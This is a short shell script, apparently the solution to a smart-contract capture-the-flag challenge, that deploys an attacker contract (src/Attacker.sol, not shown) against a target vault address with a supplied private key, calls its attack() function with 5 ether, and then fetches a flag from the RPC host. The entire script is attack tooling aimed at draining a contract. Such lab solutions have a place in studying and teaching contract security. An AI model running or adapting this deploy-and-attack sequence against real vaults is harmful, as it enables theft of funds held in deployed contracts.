VAULT=$1
RPC=$2
PK=$3
ATT=$(forge create src/Attacker.sol:Attacker --rpc-url "$RPC" --private-key "$PK" --broadcast --constructor-args "$VAULT" | grep -oE "0x[0-9a-fA-F]{40}" | tail -n1)
cast send "$ATT" "attack()" --value 5ether --rpc-url "$RPC" --private-key "$PK"
curl -s "$RPC/flag"
